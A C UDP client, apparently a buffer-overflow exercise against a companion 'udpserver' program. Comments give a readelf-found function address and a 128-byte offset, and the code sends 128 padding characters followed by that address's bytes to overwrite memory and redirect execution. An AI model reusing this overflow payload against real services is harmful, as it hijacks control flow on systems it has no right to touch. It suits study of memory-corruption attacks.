/*
 * udpclient.c - A simple UDP client
 * usage: udpclient <host> <port>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define BUFSIZE 1024

/*
 * error - wrapper for perror
 */
void error(char *msg) {
    perror(msg);
    exit(0);
}

int main(int argc, char **argv) {
    int sockfd, portno, n;
    int serverlen;
    struct sockaddr_in serveraddr;
    struct hostent *server;
    char *hostname;
    char buf[BUFSIZE];

    /* check command line arguments */
    if (argc != 3) {
       fprintf(stderr,"usage: %s <hostname> <port>\n", argv[0]);
       exit(0);
    }
    hostname = argv[1];
    portno = atoi(argv[2]);

    /* socket: create the socket */
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
        error("ERROR opening socket");

    /* gethostbyname: get the server's DNS entry */
    server = gethostbyname(hostname);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host as %s\n", hostname);
        exit(0);
    }

    /* build the server's Internet address */
    bzero((char *) &serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    bcopy((char *)server->h_addr,
	  (char *)&serveraddr.sin_addr.s_addr, server->h_length);
    serveraddr.sin_port = htons(portno);

    /* get a message from the user */

    bzero(buf, BUFSIZE);





    //readelf udpserver -s
    //address of pvtot() 0000000000400a2d

    //128 characters = dif between buf address and cachorros array address 6,299,872    6,300,000

    strcat(buf, "String big enough to complete the 128 required characters.......................................................................");

    buf[128]  = 0x2d; //45 00101101 128
    buf[129]  = 0x0a; //10 00001010 129
    buf[130]  = 0x40; //64 01000000 130

    // buf[0] = 'T';
    // buf[1] = 'E';
    // buf[2] = 'S';
    // buf[3] = 'T';
    // buf[4] = ' ';
    // buf[5] = 'K';
    // buf[6] = '\n';
    // buf[7] = 'K';
    // buf[8] = '\n';
    // buf[9] = 'K';












    /* send the message to the server */
    serverlen = sizeof(serveraddr);
    n = sendto(sockfd, buf, strlen(buf), 0, &serveraddr, serverlen);
    if (n < 0)
      error("ERROR in sendto");

    /* print the server's reply */
    n = recvfrom(sockfd, buf, strlen(buf), 0, &serveraddr, &serverlen);
    if (n < 0)
      error("ERROR in recvfrom");
    printf("Echo from server: %s", buf);
    return 0;
}
